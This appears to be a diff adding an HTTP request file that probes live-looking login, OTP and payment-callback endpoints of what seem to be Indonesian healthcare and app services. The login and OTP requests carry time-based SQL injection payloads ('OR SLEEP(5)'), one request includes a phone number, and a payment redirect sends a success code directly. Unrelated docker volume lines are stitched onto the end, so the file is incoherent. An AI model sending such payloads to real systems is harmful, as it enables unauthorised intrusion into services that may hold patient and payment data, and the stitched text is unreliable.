@@ -1,0 +1,36 @@
+POST https://devone.aplikasi.web.id/one-api/v1/system/auth/login
+
+{
+    "username": "1 OR SLEEP(5)",
+    "password": "admin123"
+}
+
+###
+GET https://mobile.pramita.co.id/one_api_coba/mobile/test/getInitForm
+
+###
+POST https://mobile.pramita.co.id/one_api_coba/mobile/login/checkOTP
+
+{
+    "otp": "4315 OR SLEEP(5)",
+    "hp": "085159445925"
+}
+
+###
+GET https://mobile.pramita.co.id/one_api_coba/pg/duitku/rdr?merchantOrderId=12345&reference=REF123456&resultCode=SUCCESS
+
+
+###
+POST https://devregonline.pramita.co.id/one-api/mobile/test/getListingTestByCategory
+
+{
+    "id" : "19",
+    "selected_category" : "19",
+    "current_page" : "1"
+}
+
+- "/data/docker/dcm4chee/server/default/archive:/srv/dcm4chee/server/default/archive"
+      - "/data/docker/dcm4chee/server/default/deploy:/srv/dcm4chee/server/default/deploy"
+      - "/data/docker/dcm4chee/server/default/log:/srv/dcm4chee/server/default/log"
+      - "/data/docker/dcm4chee/server/default/tmp:/srv/dcm4chee/server/default/tmp"
+      - "/data/docker/dcm4chee/server/default/work:/srv/dcm4chee/server/default/work"
